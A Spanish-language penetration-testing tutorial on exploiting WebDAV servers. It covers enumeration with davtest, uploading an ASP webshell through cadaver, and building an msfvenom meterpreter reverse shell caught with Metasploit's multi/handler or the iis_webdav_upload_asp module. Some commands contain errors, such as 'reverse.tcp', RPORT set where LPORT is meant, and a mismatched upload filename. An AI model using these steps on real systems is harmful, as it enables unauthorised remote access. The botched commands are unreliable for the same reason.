<h1 align="center">EXPLOTAR EL PROTOCOLO WEBDAV</h1>

# DEFINICIÓN

Webdav es un protocolo que nos permite guardar archivos, editarlos, moverlos y compartirlos en un servidor web, no necesitaremos utilizar otros protocolos de intercambio de archivos como Samba, FTP o NFS. El objetivo de WebDAV es que se pueda trabajar directamente en el servidor web

# EXPLOTACIÓN CON DAVTEST Y CADAVER

Lo primero que tenemos que hacer es comprobar si es un servidor WebDav. Se puede comprobar con:

- davtest
- http-enum con scripts de nmap
- gobuster

Con este comando, se identifican las rutas y los tipos de archivos que el servidor WebDAV permite cargar y ejecutar

- `davtest -url http://*IP*/webdav`

Si disponemos de las credenciales, para iniciar sesión en Webdav:

- `davtest -auth *usuario*:*contraseña* -url [http://IPobj/webdav](http://ipobj/webdav)`

Cuando se realiza la conexión, el servicio Webdav te devuelve información que es importante tener en cuenta:

\-Se autoriza la conexión

\-Se le genera un ID para la sesión

\-Muestra los archivos que se pueden subir al servidor Webdav

![image](https://github.com/user-attachments/assets/0999a316-a259-415c-b791-7cb8592b3752)

\-Muestra los archivos que se pueden ejecutar en el servidor Webdav

![image](https://github.com/user-attachments/assets/707f3101-b489-4baa-b62a-052bc7bee8eb)

Ahora que sabemos que archivos podemos subir y ejecutar en el servicio webdav (en este caso un archivo .asp), podemos utilizar la herramienta “Cadaver” para subir nuestro exploit y ejecutarlo. Cadaver también permite descargar archivos, eliminarlos…:

## Uso

\-Iniciar sesion en webdav con cadaver:

- `cadaver http://*ip*/webdav` (Introducir credenciales despues)

Cuando se accede se habre una shell de webdav. Para subir nuestro payload, como el servidor permite subir y ejecutar archivos .asp subiremos el de la ruta /usr/share/webshells/asp/webshell.asp con el comando:

- `put /usr/share/webshells/asp/webshell.asp`

Esta webshell proporcionará ejecución de comandos remota al hacer click en el exploit. También podemos subir una reverse shell que nos conceda acceso a la máquina víctima como vamos a ver en el siguiente ejemplo

# EXPLOTARLO MSFVENOM Y METASPLOIT

El servidor Webdav también se puede explotar con METASPLOIT y MSFVENOM. Para ello, generamos nuestro payload en msfvenom:

- `msfvenom -p windows/meterpreter/reverse.tcp -LHOST=*ip_kali* -LPORT=*puerto* -f asp >shell.asp`

(Esto generará un payload para un windows con una arquitectura de 86 bits, si no se sabe cual es la arquitectura de la víctima, es más recomendable utilizar uno de 32 bits ya que funcionará en cualquier arquitectura)

Iniciamos sesión en el servidor Webdav para subir nuestro payload con Cadaver:

- `Cadaver -auth *usuario*:*contra* -url http://*ip*/webdav`

Subimos el payload:

- `put /*ruta_payload*/reverse.tcp`

Ponemos a la escucha el multi/handler con metasploit:

- `use multi/handler`

Para que funcione el multi/handler, tenemos que establecer el mismo payload, ip y puerto que hemos subido al servidor webdav (el que hemos generado con msfvenom):

- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST *ip_kali*`
- `set RPORT *puerto*`

# EXPLOTARLO ÚNICAMENTE CON METASPLOIT

Esta es otra forma de poder subir el payload con un módulo de metasploit, que además, también proporciona directamente la sesión meterpreter sin tener que poner a la escucha el módulo de multi/handler:

- `use iis_webdav_upload_asp`

Este módulo subirá un archivo asp al servicio webdav, se ejecutará y nos proporcionará una sesión de meterpreter.
